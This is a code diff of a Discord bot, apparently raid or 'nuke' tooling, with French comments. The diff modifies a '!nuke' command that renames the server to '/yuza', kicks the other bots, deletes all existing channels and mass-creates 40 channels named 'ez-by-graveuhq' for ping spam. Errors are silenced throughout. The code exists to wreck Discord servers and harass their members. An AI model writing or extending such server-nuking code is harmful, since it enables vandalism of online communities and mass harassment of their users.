@@ -117,7 +117,7 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Ultra-Fast + Création Massive de Salons + Pings)
+    // 2. COMMANDE !NUKE (Ultra-Fast + Rename Serveur + Clean + Spam)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -125,7 +125,10 @@ client.on('messageCreate', async message => {
         await message.reply("💥 **[NUKE]** Destruction en cours...");
 
         try {
-            // A. Kick des autres bots
+            // A. Renommer le serveur en "/yuza"
+            await message.guild.setName('/yuza').catch(() => {});
+
+            // B. Kick des autres bots
             const members = await message.guild.members.fetch();
             members.forEach(m => {
                 if (m.user.bot && m.id !== client.user.id) {
@@ -133,13 +136,13 @@ client.on('messageCreate', async message => {
                 }
             });
 
-            // B. Suppression des salons existants pour nettoyer
+            // C. Suppression des salons existants
             const oldChannels = message.guild.channels.cache;
             oldChannels.forEach(channel => {
                 channel.delete().catch(() => {});
             });
 
-            // C. Création massive de 40 salons en même temps et spam immédiat de pings
+            // D. Création massive de 40 salons "ez-by-graveuhq" et spam de pings
             for (let i = 0; i < 40; i++) {
                 message.guild.channels.create({
                     name: 'ez-by-graveuhq',
